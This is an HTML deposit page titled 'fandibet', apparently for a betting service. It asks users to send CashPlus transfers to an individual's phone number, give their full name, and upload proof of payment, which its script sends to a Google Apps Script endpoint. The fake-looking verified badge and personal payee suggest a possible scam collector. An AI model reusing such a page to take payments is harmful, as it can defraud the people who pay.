<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <title>fandibet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
  <style>
    body {
      margin:0;
      background:#0b0c10;
      color:#fff;
      font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    }

    header {
      background:#1c1c1c;
      height:44px;
      display:flex;
      justify-content:center;
      align-items:center;
    }
    .logo {
      font-size:15px;
      font-weight:500;
      display:flex;
      align-items:center;
      gap:6px;
    }
    .logo svg {
      width:16px;
      height:16px;
      flex-shrink:0;
    }

    .card {
      background:#ffffff;
      border-radius:0;
      width:90%;         
      max-width:420px;
      margin:30px auto;  
      display:flex;
      flex-direction:column;
      overflow:hidden;
      box-shadow:0 4px 12px rgba(0,0,0,0.25);
    }
    .card-top {
      padding:20px 0;    
      display:flex;
      align-items:center;
      justify-content:center;
      background:#ffffff;
    }
    .card-top img {
      max-height:55px;
      max-width:85%;
      object-fit:contain;
      display:block;
    }
    .card-bottom {
      background:#f7f7f7;
      padding:20px;
      color:#000;
    }

    .payment-line{
      display:flex;
      align-items:center;
      gap:8px; 
      margin:12px 0;
    }
    .blue-text{font-size:14px;color:#001F54}
    .blue-text strong{font-weight:600}
    .normal-text{color:#001F54}
    .copy-icon{display:flex;align-items:center;cursor:pointer;}
    .copy-icon img{width:16px;height:16px;}
    .copied-text{color:#000;font-size:13px;margin-left:4px;visibility:hidden;}
    .copied-text.show{visibility:visible}

    .info-block{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:18px;gap:10px}
    .info-label{flex:0 0 55%;max-width:55%;text-align:left;color:#001F54;font-weight:500;font-size:14px;line-height:1.4}
    .info-input{flex:0 0 45%;max-width:45%}
    input[type=text]{width:100%;padding:10px;font-size:15px;border:none;border-top:1px solid #bbb;border-left:1px solid #bbb;border-radius:0;text-align:center;background:#fff;color:#000}
    .english-numbers{direction:ltr;text-align:center;font-feature-settings:"lnum"}

    input[type=text]:focus,
    input[type=file]:focus {
      outline: none;
      box-shadow: none;
    }

    .upload-section{background:#ccc;width:70px;height:70px;display:flex;align-items:center;justify-content:center;border-radius:0}
    .upload-section input[type=file]{display:none}
    .upload-section label{font-size:30px;color:#fff;cursor:pointer;line-height:1}
    .preview-image{width:70px;height:70px;object-fit:cover;border:1px solid #ccc;display:none;border-radius:0}
    .note{font-size:12px;color:#666;margin-top:4px}

    .submit-btn{
      background:#007bff;
      color:#fff;
      font-size:16px;
      padding:14px;
      border:none;
      border-radius:0;
      width:100%;
      cursor:pointer;
      transition:.3s ease;
      box-shadow:0 2px 6px rgba(0,0,0,0.2);
      display:flex;
      justify-content:center;
      align-items:center;
      gap:10px;
    }
    .submit-btn .btn-spinner {
      width:18px;
      height:18px;
      border:3px solid rgba(255,255,255,0.5);
      border-top-color:#fff;
      border-radius:50%;
      animation:spin 1s linear infinite;
    }
    .submit-btn:disabled{
      opacity:0.8;
      cursor:not-allowed;
    }

    /* شاشة التحميل */
    .loading-overlay {
      position:fixed;
      top:0;left:0;right:0;bottom:0;
      background:rgba(0,0,0,0.5);
      display:none;
      justify-content:center;
      align-items:center;
      z-index:9999;
    }
    .loading-card {
      background:#fff;
      color:#000;
      padding:16px 22px;
      border-radius:0;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:20px;
      font-size:15px;
      font-weight:400;
      min-width:160px;
      box-shadow:0 2px 10px rgba(0,0,0,0.25);
    }
    .loading-card span {
      flex:1;
      text-align:left;
    }
    .loading-circle {
      width:20px;
      height:20px;
      border:3px solid #ddd;
      border-top-color:#007bff;
      border-radius:50%;
      animation:spin 1s linear infinite;
    }
    @keyframes spin {
      to{transform:rotate(360deg)}
    }

    @media (max-width: 380px) {
      .card {width:95%;margin:20px auto;}
      .card-top img {max-height:45px;}
      .info-label {flex:0 0 50%;max-width:50%;font-size:13px;}
      .info-input {flex:0 0 50%;max-width:50%;}
      input[type=text] {font-size:14px;padding:8px;}
      .payment-line {flex-wrap:wrap;font-size:13px;}
      .blue-text {font-size:13px;}
      .upload-section,.preview-image {width:60px;height:60px;}
      .submit-btn {font-size:15px;padding:12px;}
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">fandibet
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" fill="#1DA1F2"/>
        <path d="M9.5 12.5l2 2 4-4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <form class="card" id="transferForm">
    <div class="card-top">
      <a href="https://freeimage.host/ar" target="_blank">
        <img src="https://iili.io/KTqvX2a.png" alt="KTqvX2a.png">
      </a>
    </div>

    <div class="card-bottom">
      <div class="payment-line">
        <span class="blue-text"><strong>CASHPLUS AMINE</strong> <span class="normal-text">0767442227</span></span>
        <span class="copy-icon" onclick="copyText(this,'0767442227')">
          <img src="https://i.postimg.cc/ZnpNqgK3/file-000000001e9c620a954f9b15e02be3c1.png" alt="copy-icon">
          <span class="copied-text">Copié</span>
        </span>
      </div>

      <div class="payment-line">
        <span class="blue-text"><strong>MOTIF</strong> <span class="normal-text">jawaher</span></span>
        <span class="copy-icon" onclick="copyText(this,'jawaher')">
          <img src="https://i.postimg.cc/ZnpNqgK3/file-000000001e9c620a954f9b15e02be3c1.png" alt="copy-icon">
          <span class="copied-text">Copié</span>
        </span>
      </div>

      <div class="info-block">
        <div class="info-label">Montant (Min 100.00 MAD / Max 5000.00 MAD):</div>
        <div class="info-input">
          <input type="text" name="amount" class="english-numbers" value="100.00">
        </div>
      </div>

      <div class="info-block">
        <div class="info-label">Cash Plus اسمك الكامل في:</div>
        <div class="info-input">
          <input type="text" name="sender_name" id="sender_name">
        </div>
      </div>

      <div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">
        <div style="flex:0 0 55%;color:#001F54;font-size:14px;line-height:1.4">
          <strong>من فضلك قم بتحميل الاسكرين شوت<br>لعمليه التحويل الناجحه:</strong>
          <div class="note">(.jpg, .jpeg, .png, .pdf. La taille maximale du fichier est de 20 Mo)</div>
        </div>
        <div style="flex:0 0 45%;display:flex;align-items:center;gap:10px">
          <div class="upload-section">
            <label for="proof">+</label>
            <input type="file" id="proof" name="proof" accept=".jpg,.jpeg,.png,.pdf">
          </div>
          <img id="preview" class="preview-image" />
        </div>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">Confirmer</button>
    </div>
  </form>

  <!-- بطاقة التحميل -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
      <span>Chargement...</span>
      <div class="loading-circle"></div>
    </div>
  </div>

  <input type="text" id="hiddenCopyInput" style="position:absolute;top:-9999px;left:-9999px;" readonly>

  <script>
    function copyText(el,val){
      if(navigator.clipboard){
        navigator.clipboard.writeText(val).then(()=>showCopied(el)).catch(()=>fallbackCopy(el,val))
      }else fallbackCopy(el,val)
    }
    function fallbackCopy(el,val){
      const i=document.getElementById('hiddenCopyInput');i.value=val;i.select();document.execCommand('copy');showCopied(el)
    }
    function showCopied(el){
      const c=el.querySelector('.copied-text');
      if(c){
        c.classList.add('show');
        setTimeout(()=>c.classList.remove('show'),1200)
      }
    }
    document.getElementById('proof').addEventListener('change',e=>{
      const f=e.target.files[0],p=document.getElementById('preview');
      if(f&&f.type.startsWith('image/')){
        const r=new FileReader();
        r.onload=ev=>{p.src=ev.target.result;p.style.display='block'};
        r.readAsDataURL(f)
      }else{p.src='';p.style.display='none'}
    });

    function getSecureURL(){
      return "https://script.google.com/macros/s/AKfycby_yPgXCCFpvGRQ4Doa1FMfHS4jXd5y8p--fPQAFnADcFI6IcvfPp5WtZjt2GjqXzoneQ/exec"
    }

    document.getElementById("transferForm").addEventListener("submit",async e=>{
      e.preventDefault();
      const f=e.target,a=f.amount.value.trim(),n=f.sender_name.value.trim(),file=document.getElementById("proof").files[0],btn=document.getElementById("submitBtn");
      btn.disabled=true;
      // تغيير محتوى الزر إلى دائرة زرقاء
      btn.innerHTML = '<div class="btn-spinner"></div>';
      document.getElementById("loadingOverlay").style.display="flex"; // إظهار البطاقة
      try{
        const r=new FileReader();
        r.onloadend=async function(){
          const b=r.result;
          const res=await fetch(getSecureURL(),{
            method:"POST",
            headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},
            body:new URLSearchParams({amount:a,fullname:n,imageBase64:b})
          });
          if(res.ok){
            window.location.replace("secure-recharge-cp.html");
          }else{
            btn.disabled=false;
            btn.innerHTML = 'Confirmer';
            document.getElementById("loadingOverlay").style.display="none";
          }
        };
        if(file){r.readAsDataURL(file)} else {
          btn.disabled=false;
          btn.innerHTML = 'Confirmer';
          document.getElementById("loadingOverlay").style.display="none";
        }
      }catch(err){
        btn.disabled=false;
        btn.innerHTML = 'Confirmer';
        document.getElementById("loadingOverlay").style.display="none";
      }
    });
  </script>
</body>
</html>
